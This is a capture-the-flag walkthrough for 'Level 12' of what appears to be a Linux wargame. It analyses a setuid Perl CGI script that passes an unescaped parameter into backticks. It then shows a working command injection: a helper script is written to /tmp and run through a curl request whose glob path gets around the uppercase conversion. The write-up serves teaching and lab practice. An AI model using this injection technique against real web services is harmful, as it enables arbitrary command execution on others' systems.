# Level 12


<br>

### >> [Flag file](../flag) <<

<br>


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
> d--x--x--x  1 root    users    340 Aug 30  2015 ..
> -r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
> -r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
> -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
> -r-x------  1 level12 level12  675 Apr  3  2012 .profile
> ```

- Inside of it:
```bash
cat level12.pl
```

> ```perl
> #!/usr/bin/env perl
> # localhost:4646
> use CGI qw{param};
> print "Content-type: text/html\n\n";
> 
> sub t {
>   $nn = $_[1];
>   $xx = $_[0];
>   $xx =~ tr/a-z/A-Z/; 
>   $xx =~ s/\s.*//;
>   @output = `egrep "^$xx" /tmp/xd 2>&1`;
>   foreach $line (@output) {
>       ($f, $s) = split(/:/, $line);
>       if($s =~ $nn) {
>           return 1;
>       }
>   }
>   return 0;
> }
> 
> sub n {
>   if($_[0] == 1) {
>       print("..");
>   } else {
>       print(".");
>   }    
> }
> 
> n(t(param("x"), param("y")));
> ```

> If we rearrange the code a bit, we can see that it is vulnerable to command injection:
> ```perl
> #!/usr/bin/env perl
> # localhost:4646
> use CGI qw{param};
> print "Content-type: text/html\n\n";
> 
> $paramY = param("y");
> $paramX = param("x");
> 
> $paramX =~ tr/a-z/A-Z/;  # Convert lowercase letters to uppercase
> $paramX =~ s/\s.*//;     # Remove everything after the first whitespace
> 
> # Search for lines starting with $paramX in /tmp/xd
> @output = `egrep "^$paramX" /tmp/xd 2>&1`;  # Injection point: $paramX is not properly escaped
> foreach $line (@output) {
> 	($a, $b) = split(/:/, $line);  # Split the line into two parts using ':' as the delimiter
> 	if($b =~ $paramY) {            # Check if the second part matches $paramY
> 		print("..");
> 		exit 0;
> 	}
> }
> print(".");
> ```


#### Step 2:

- Let's make a little script to get the flag. It should be in uppercase because of the `tr/a-z/A-Z/` command.
```bash
	echo -e '#!/bin/bash\ngetflag > /tmp/flag && chmod 777 /tmp/flag' > /tmp/SCRIPT && chmod 777 /tmp/SCRIPT
```

> To make it work, the final command that is executed should look like this:
> ```bash
> egrep "^"`/*/SCRIPT`"" /tmp/xd 2>&1
> ```

- Let's try to inject a command to get the flag:
```bash
curl 'localhost:4646?x=`/*/SCRIPT`&y=whatever'
```


#### Step 3:

- Get the output flag:
```bash
cat /tmp/flag
```


<br>

---

[<<](/level11/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level13/resources/Readme.md)
